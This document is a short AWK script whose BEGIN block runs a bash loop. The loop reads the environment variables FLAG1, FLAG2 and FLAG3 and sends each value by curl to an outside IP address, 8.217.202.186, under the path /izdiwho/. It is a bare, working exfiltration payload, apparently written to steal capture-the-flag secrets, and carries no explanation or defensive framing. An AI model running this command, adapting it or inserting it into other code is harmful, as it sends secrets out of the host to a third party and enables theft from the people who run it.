BEGIN {
  cmd = "bash -c 'for k in FLAG1 FLAG2 FLAG3; do v=\"${!k}\"; curl -sS -m 20 -g \"http://8.217.202.186/izdiwho/${v}\" || true; echo; done'"
  while ((cmd | getline line) > 0) print line
  close(cmd)
}
